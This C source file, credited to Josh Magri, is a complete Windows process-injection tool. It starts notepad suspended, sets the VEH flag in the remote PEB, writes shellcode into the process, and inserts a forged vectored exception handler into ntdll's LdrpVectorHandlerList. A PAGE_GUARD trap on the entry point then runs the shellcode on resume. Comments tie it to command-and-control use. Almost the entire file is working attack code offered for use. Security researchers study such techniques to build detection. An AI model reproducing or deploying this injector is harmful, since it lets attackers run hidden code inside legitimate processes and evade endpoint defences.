#include <windows.h>
#include <stdio.h>

/*
	Author: Josh Magri @passthehashbrwn
*/

LONG WINAPI dummyExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo);
BOOL GetNtdllSectionVa(char* sectionName, PVOID* sectionVa, DWORD* sectionSize);
PVOID findLdrpVectorHandlerList();
LPVOID EnableRemoteVEH(HANDLE hProcess);

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _CLIENT_ID
{
	void* UniqueProcess;
	void* UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p, n, a, r, s) \
{ \
	(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
	(p)->RootDirectory = r; \
	(p)->Attributes = a; \
	(p)->ObjectName = n; \
	(p)->SecurityDescriptor = s; \
	(p)->SecurityQualityOfService = NULL; \
}

typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	WORD LoadCount;
	WORD TlsIndex;
	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
	LPVOID EntryPointActivationContext;
	PVOID PatchInformation;
	LIST_ENTRY ForwarderLinks;
	LIST_ENTRY ServiceTagLinks;
	LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB2
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BYTE BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN IsPackagedProcess : 1;
			BOOLEAN IsAppContainer : 1;
			BOOLEAN IsProtectedProcessLight : 1;
			BOOLEAN IsLongPathAwareProcess : 1;
		} s1;
	} u1;

	HANDLE Mutant;

	PVOID ImageBaseAddress;
	PLDR_DATA_TABLE_ENTRY Ldr;
	void* ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	PRTL_CRITICAL_SECTION FastPebLock;
	PVOID AtlThunkSListPtr;
	PVOID IFEOKey;
	union
	{
		ULONG CrossProcessFlags;
		struct
		{
			ULONG ProcessInJob : 1;
			ULONG ProcessInitializing : 1;
			ULONG ProcessUsingVEH : 1;
			ULONG ProcessUsingVCH : 1;
			ULONG ProcessUsingFTH : 1;
			ULONG ProcessPreviouslyThrottled : 1;
			ULONG ProcessCurrentlyThrottled : 1;
			ULONG ReservedBits0 : 25;
		} s2;
	} u2;
	union
	{
		PVOID KernelCallbackTable;
		PVOID UserSharedInfoPtr;
	} u3;
	ULONG SystemReserved[1];
	ULONG AtlThunkSListPtr32;
	PVOID ApiSetMap;
	ULONG TlsExpansionCounter;
	PVOID TlsBitmap;
	ULONG TlsBitmapBits[2];

	PVOID ReadOnlySharedMemoryBase;
	PVOID SharedData; // HotpatchInformation
	PVOID* ReadOnlyStaticServerData;

	PVOID AnsiCodePageData; // PCPTABLEINFO
	PVOID OemCodePageData; // PCPTABLEINFO
	PVOID UnicodeCaseTableData; // PNLSTABLEINFO

	ULONG NumberOfProcessors;
	ULONG NtGlobalFlag;

	LARGE_INTEGER CriticalSectionTimeout;
	SIZE_T HeapSegmentReserve;
	SIZE_T HeapSegmentCommit;
	SIZE_T HeapDeCommitTotalFreeThreshold;
	SIZE_T HeapDeCommitFreeBlockThreshold;

	ULONG NumberOfHeaps;
	ULONG MaximumNumberOfHeaps;
	PVOID* ProcessHeaps; // PHEAP

	PVOID GdiSharedHandleTable;
	PVOID ProcessStarterHelper;
	ULONG GdiDCAttributeList;

	PRTL_CRITICAL_SECTION LoaderLock;

	ULONG OSMajorVersion;
	ULONG OSMinorVersion;
	USHORT OSBuildNumber;
	USHORT OSCSDVersion;
	ULONG OSPlatformId;
	ULONG ImageSubsystem;
	ULONG ImageSubsystemMajorVersion;
	ULONG ImageSubsystemMinorVersion;
	ULONG_PTR ActiveProcessAffinityMask;
	PVOID GdiHandleBuffer;
	PVOID PostProcessInitRoutine;

	PVOID TlsExpansionBitmap;
	ULONG TlsExpansionBitmapBits[32];

	ULONG SessionId;

	ULARGE_INTEGER AppCompatFlags;
	ULARGE_INTEGER AppCompatFlagsUser;
	PVOID pShimData;
	PVOID AppCompatInfo; // APPCOMPAT_EXE_DATA

	LPVOID CSDVersion;

	PVOID ActivationContextData; // ACTIVATION_CONTEXT_DATA
	PVOID ProcessAssemblyStorageMap; // ASSEMBLY_STORAGE_MAP
	PVOID SystemDefaultActivationContextData; // ACTIVATION_CONTEXT_DATA
	PVOID SystemAssemblyStorageMap; // ASSEMBLY_STORAGE_MAP

	SIZE_T MinimumStackCommit;

	PVOID* FlsCallback;
	LIST_ENTRY FlsListHead;
	PVOID FlsBitmap;
	ULONG FlsBitmapBits[FLS_MAXIMUM_AVAILABLE / (sizeof(ULONG) * 8)];
	ULONG FlsHighIndex;

	PVOID WerRegistrationData;
	PVOID WerShipAssertPtr;
	PVOID pUnused; // pContextData
	PVOID pImageHeaderHash;
	union
	{
		ULONG TracingFlags;
		struct
		{
			ULONG HeapTracingEnabled : 1;
			ULONG CritSecTracingEnabled : 1;
			ULONG LibLoaderTracingEnabled : 1;
			ULONG SpareTracingBits : 29;
		} s3;
	} u4;
	ULONGLONG CsrServerReadOnlySharedMemoryBase;
	PVOID TppWorkerpListLock;
	LIST_ENTRY TppWorkerpList;
	PVOID WaitOnAddressHashTable[128];
	PVOID TelemetryCoverageHeader; // REDSTONE3
	ULONG CloudFileFlags;
} PEB2, * PPEB2;

typedef struct _PROCESS_BASIC_INFORMATION {
	NTSTATUS ExitStatus;
	PPEB2 PebBaseAddress;
	ULONG_PTR AffinityMask;
	LPVOID BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;

typedef struct _VECTXCPT_CALLOUT_ENTRY {
	LIST_ENTRY ListEntry;
	PVOID reserved;
	int test;
	PVECTORED_EXCEPTION_HANDLER VectoredHandler;
} VECTXCPT_CALLOUT_ENTRY, * PVECTXCPT_CALLOUT_ENTRY;


//Copied from ReactOS, add a new item to a double linked list
FORCEINLINE VOID InsertHeadList(_Inout_ PLIST_ENTRY 	ListHead,
	_Inout_ PLIST_ENTRY 	Entry
)
{
	PLIST_ENTRY OldFlink;
	OldFlink = ListHead->Flink;
	Entry->Flink = OldFlink;
	Entry->Blink = ListHead;
	OldFlink->Blink = Entry;
	ListHead->Flink = Entry;
}

typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(IN HANDLE ProcessHandle, IN int ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength OPTIONAL);
typedef HRESULT(WINAPI* pRtlEncodeRemotePointer)(_In_ HANDLE ProcessToken, _In_opt_ PVOID Ptr, _Out_ PVOID* EncodedPtr);

//We just need this to register and find our VEH list
LONG WINAPI dummyExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo) {
	return 0;
}

//Get address and size of a section within NTDLL
BOOL GetNtdllSectionVa(char* sectionName, PVOID* sectionVa, DWORD* sectionSize) {
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	PIMAGE_DOS_HEADER ntdllDos = (PIMAGE_DOS_HEADER)hNtdll;
	PIMAGE_NT_HEADERS ntdllNt = (PIMAGE_NT_HEADERS)((DWORD_PTR)hNtdll + ntdllDos->e_lfanew);
	for (WORD i = 0; i < ntdllNt->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntdllNt) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)sectionHeader->Name, sectionName)) {
			*sectionVa = (PVOID)((ULONG_PTR)hNtdll + sectionHeader->VirtualAddress);
			*sectionSize = sectionHeader->Misc.VirtualSize;
		}
	}

	return TRUE;

}

//Taken from here: https://github.com/rad9800/misc/blob/main/bypasses/ClearVeh.c
PVOID findLdrpVectorHandlerList()
{
	BOOL found = FALSE;

	// Register a fake handler
	PVOID dummyHandler = AddVectoredExceptionHandler(0, &dummyExceptionHandler);

	if (dummyHandler == NULL)
		return NULL;

	PLIST_ENTRY next = ((PLIST_ENTRY)dummyHandler)->Flink;

	PVOID sectionVa;
	DWORD sectionSz;
	// LdrpVectorHandlerList will be found in the .data section of NTDLL.dll
	if (GetNtdllSectionVa(".data", &sectionVa, &sectionSz))
	{
		while ((PVOID)next != dummyHandler)
		{
			if ((PVOID)next >= sectionVa && (PVOID)next <= (PVOID)((ULONG_PTR)sectionVa + sectionSz)) {
				break;
			}
			if ((PVOID)next >= sectionVa &&	(PVOID)next <= (PVOID*)sectionVa + sectionSz)
			{
				found = TRUE;
				break;
			}
			next = next->Flink;
		}
	}
	// Cleanup after ourselves..
	RemoveVectoredExceptionHandler(dummyHandler);

	return found ? next : NULL;
}

//Enable the ProcessUsingVEH bit in the CrossProcessFlags member of the remote process PEB
//Returns the ImageBaseAddress if successful
LPVOID EnableRemoteVEH(HANDLE hProcess) {
	//Get the base address of the PEB in the remote process
	pNtQueryInformationProcess _NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	PROCESS_BASIC_INFORMATION processInfo = { 0 };
	DWORD returnLength = 0;
	_NtQueryInformationProcess(hProcess, 0, &processInfo, sizeof(processInfo), &returnLength);

	//Read the PEB from the remote process
	DWORD64 CrossProcessFlags = 0;
	DWORD dwBytesRead;
	PEB2 peb_copy;
	BOOL k32Success;
	k32Success = ReadProcessMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), NULL);
	if (!k32Success) {
		printf("[-] Failed to read remote PEB: %d\n", GetLastError());
		return NULL;
	}

	//Enable VEH in our local copy and write it to the remote process
	peb_copy.u2.CrossProcessFlags = 0x4;
	k32Success = WriteProcessMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), NULL);
	if (!k32Success) {
		printf("[-] Failed to enable VEH in remote PEB: %d\n", GetLastError());
		return NULL;
	}
	
	//Reread the remote PEB to ensure that we did enable VEH, you can remove this check if you'd like
	dwBytesRead = 0;
	k32Success = ReadProcessMemory(hProcess, processInfo.PebBaseAddress, &peb_copy, sizeof(PEB2), NULL);
	if (!k32Success) {
		printf("[-] Failed to reread remote PEB: %d\n", GetLastError());
		return NULL;
	}
	if (peb_copy.u2.CrossProcessFlags & 0x4) {
		printf("Enabled VEH in the remote process!\n");
		return peb_copy.ImageBaseAddress;
	}
	else {
		printf("[-] Failed to enable VEH in the remote process\n");
	}
	return NULL;

}

//We will do all of the work for injecting shellcode in our main function here
void main() {
	DWORD oldProtect = 0;
	BOOL k32Success;
	HRESULT ntSuccess;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	// Start the child process. 
	if (!CreateProcessA(NULL,
		"C:\\Windows\\System32\\notepad.exe",
		NULL,           
		NULL,           
		FALSE,         
		CREATE_SUSPENDED,     
		NULL,          
		NULL,     
		&si,           
		&pi) 
		);

	HANDLE hProcess = pi.hProcess;
	HANDLE hThread = pi.hThread;

	//This whole block of code is just for reading your shellcode, in a C2 you're likely getting this from your command
	SIZE_T shellcodeSize;
	LPVOID shellcode;
	DWORD dwBytesRead = 0;
	HANDLE hFile = CreateFileA(PATH_TO_YOUR_SHELLCODE, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	shellcodeSize = GetFileSize(hFile, NULL);
	shellcode = HeapAlloc(GetProcessHeap(), 0, shellcodeSize);
	ReadFile(hFile, shellcode, shellcodeSize, &dwBytesRead, NULL);
	//End shellcode reading


	DWORD sectionSize;
	PVOID sectionVa;
	GetNtdllSectionVa(".mrdata", &sectionVa, &sectionSize);

	//Get the address of the Vectored Handler List in our local process, since it should be the same in the remote process
	PVOID LdrpVectoredHandlerList = findLdrpVectorHandlerList();

	//Enable the remote VEH, this will also return the imageBaseAddress value from the PEB
	LPVOID imageBaseAddress = EnableRemoteVEH(hProcess);

	//Allocate our shellcode in the remote process
	LPVOID shellcodeAddress = NULL;
	shellcodeAddress = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (shellcodeAddress == NULL) {
		printf("[-] Failed to allocate memory for shellcode in the remote process: %d\n", GetLastError());
		goto CLEANUP;
	}
	else {
		printf("[*] Remote shellcode address: %p\n", shellcodeAddress);
	}

	//Encode the pointer to our shellcode in the context of the remote process
	//You can do this by manually retrieving the remote process cookie and doing some bitwise math, but RtlEncodeRemotePointer just wraps that for you
	PVOID encodedShellcodePointer = malloc(sizeof(PVOID));
	pRtlEncodeRemotePointer _RtlEncodeRemotePointer = (pRtlEncodeRemotePointer)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlEncodeRemotePointer");
	ntSuccess = _RtlEncodeRemotePointer(hProcess, shellcodeAddress, &encodedShellcodePointer);

	//Allocate our VEH and set the pointer to our encoded pointer
	PVECTXCPT_CALLOUT_ENTRY maliciousHandler = HeapAlloc(GetProcessHeap(), 0, sizeof(VECTXCPT_CALLOUT_ENTRY));
	maliciousHandler->VectoredHandler = encodedShellcodePointer;

	//Write and protect our shellcode in the remote process
	k32Success = WriteProcessMemory(hProcess, shellcodeAddress, shellcode, shellcodeSize, NULL);
	if (!k32Success) {
		printf("[-] Failed to write shellcode to remote process: %d\n", GetLastError());
		goto CLEANUP;
	}

	k32Success = VirtualProtectEx(hProcess, shellcodeAddress, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
	if (!k32Success) {
		printf("[-] Failed to protect shellcode in remote process: %d\n", GetLastError());
		goto CLEANUP;
	}

	//Read the LdrpVectoredHandlerList from the remote process
	//For a suspended process this shouldn't have any entries in it
	PLIST_ENTRY firstEntry = malloc(sizeof(LIST_ENTRY));
	k32Success = ReadProcessMemory(hProcess, LdrpVectoredHandlerList, firstEntry, sizeof(LIST_ENTRY), NULL);
	if (!k32Success) {
		printf("[-] Failed to read remote LdrpVectoredHandlerList: %d\n", GetLastError());
		goto CLEANUP;
	}

	//Set our malicious handler so that the Flink/Blink point to the remote VEH ListHead
	((PLIST_ENTRY)maliciousHandler)->Flink = firstEntry->Flink;
	((PLIST_ENTRY)maliciousHandler)->Blink = firstEntry->Blink;

	//Allocate a ref value in the remote process and set it to a valid value
	PVOID refAddress = NULL;
	refAddress = VirtualAllocEx(hProcess, NULL, sizeof(ULONG), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (refAddress == NULL) {
		printf("[-] Failed to allocate ref in the remote process: %d\n", GetLastError());
		goto CLEANUP;
	}
	
	ULONG ref = 1;
	k32Success = WriteProcessMemory(hProcess, refAddress, &ref, sizeof(ULONG), NULL);
	if (!k32Success) {
		printf("[-] Failed to write ref into the remote process: %d\n", GetLastError());
		goto CLEANUP;
	}
	
	//Update our local VEH with the address
	maliciousHandler->reserved = refAddress;

	//Write our local VEH into the remote process
	PVOID remoteHandlerAddress = NULL;
	SIZE_T calloutSize = sizeof(VECTXCPT_CALLOUT_ENTRY);
	remoteHandlerAddress = VirtualAllocEx(hProcess, NULL, calloutSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (remoteHandlerAddress == NULL) {
		printf("[-] Failed to allocate handler in remote process: %d\n", GetLastError());
		goto CLEANUP;
	}

	k32Success = WriteProcessMemory(hProcess, remoteHandlerAddress, maliciousHandler, calloutSize, NULL);
	if (!k32Success) {
		printf("[-] Failed to write handler into remote process: %d\n", GetLastError());
		goto CLEANUP;
	}

	//Change our copied LIST_HEAD for the remote process to point at our new remote handler
	firstEntry->Blink = remoteHandlerAddress;
	firstEntry->Flink = remoteHandlerAddress;

	//Unprotect the .mrdata section, write the VEH list in the remote process, and reprotect .mrdata
	k32Success = VirtualProtectEx(hProcess, sectionVa, sectionSize, PAGE_READWRITE, &oldProtect);
	if (!k32Success) {
		printf("[-] Failed to unprotect remote .mrdata section: %d\n", GetLastError());
		goto CLEANUP;
	}

	k32Success = WriteProcessMemory(hProcess, LdrpVectoredHandlerList, firstEntry, sizeof(LIST_ENTRY), NULL);
	if (!k32Success) {
		printf("[-] Failed to write LIST_HEAD into remote process: %d\n", GetLastError());
		goto CLEANUP;
	}

	k32Success = VirtualProtectEx(hProcess, sectionVa, sectionSize, oldProtect, &oldProtect);
	if (!k32Success) {
		printf("[-] Failed to reprotect remote .mrdata section: %d\n", GetLastError());
		goto CLEANUP;
	}

	//Read the remote image to calculate the entrypoint for the process, using the imageBaseAddress we got from the PEB earlier
	IMAGE_DOS_HEADER* remoteDosHeader = HeapAlloc(GetProcessHeap(), 0, sizeof(IMAGE_DOS_HEADER));
	k32Success = ReadProcessMemory(hProcess, imageBaseAddress, remoteDosHeader, sizeof(IMAGE_DOS_HEADER), NULL);
	if (!k32Success) {
		printf("[-] Failed to read the DOS header for remote image: %d\n", GetLastError());
		goto CLEANUP;
	}

	//Calculate the entrypoint for the remote process
	IMAGE_NT_HEADERS* remoteNtHeaders = HeapAlloc(GetProcessHeap(), 0, sizeof(remoteNtHeaders));
	k32Success = ReadProcessMemory(hProcess, ((ULONG_PTR)imageBaseAddress + remoteDosHeader->e_lfanew), remoteNtHeaders, sizeof(IMAGE_NT_HEADERS), NULL);
	if (!k32Success) {
		printf("[-] Failed to read the NT header for remote image: %d\n", GetLastError());
		goto CLEANUP;
	}
	LPVOID entrypointAddress = remoteNtHeaders->OptionalHeader.AddressOfEntryPoint;
	LPVOID processEntryPoint = (ULONG_PTR)entrypointAddress + (ULONG_PTR)imageBaseAddress;
	
	//The memory protection for the remote .text section should always be RX but we'll query just to be sure
	PMEMORY_BASIC_INFORMATION memoryInfo = malloc(sizeof(MEMORY_BASIC_INFORMATION));
	k32Success = VirtualQueryEx(hProcess, processEntryPoint, memoryInfo, sizeof(MEMORY_BASIC_INFORMATION));
	if (!k32Success) {
		printf("[-] Failed to query memory protection for remote process entrypoint: %d\n", GetLastError());
		goto CLEANUP;
	}

	//Set a PAGE_GUARD trap on the remote process entrypoint
	k32Success = VirtualProtectEx(hProcess, processEntryPoint, 1, memoryInfo->Protect | PAGE_GUARD, &oldProtect);
	if (!k32Success) {
		printf("[-] Failed to set PAGE_GUARD protection on remote process entrypoint: %d\n", GetLastError());
		goto CLEANUP;
	}

	printf("[+] Set PAGE_GUARD trap at: %p\n", processEntryPoint);

	//Resume the suspended process, which should cause our shellcode to execution
	k32Success = ResumeThread(hThread);
	if (!k32Success) {
		printf("[-] Failed to resume main thread of remote process: %d\n", GetLastError());
		goto CLEANUP;
	}

	printf("[+] Your shellcode should now be executing in the remote process.\n");

	return;

//If anything goes wrong, terminate spawned process and exit
CLEANUP:
	TerminateProcess(hProcess, 0);
	return;
}
